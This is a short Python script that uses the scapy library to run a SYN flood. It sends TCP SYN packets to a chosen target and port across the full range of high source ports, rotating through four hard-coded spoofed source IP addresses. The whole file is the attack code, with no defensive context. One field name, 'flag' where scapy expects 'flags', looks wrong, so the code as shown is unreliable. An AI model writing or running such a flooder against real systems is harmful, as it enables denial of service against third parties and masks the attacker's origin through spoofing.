import random
from scapy.all import *


def syn_attack(target, dport):
    src_list = ['201.1.1.2', '10.1.1.102', '69.1.1.2', '125.130.5.199']
    for sport in range(1024, 65535):
        index = random.randrange(4)
        ip_layer = IP(src=src_list[index], dst=target)
        tcp_layer = TCP(sport=sport, dport=dport, flag="S")
        packet = ip_layer / tcp_layer
        send(packet)


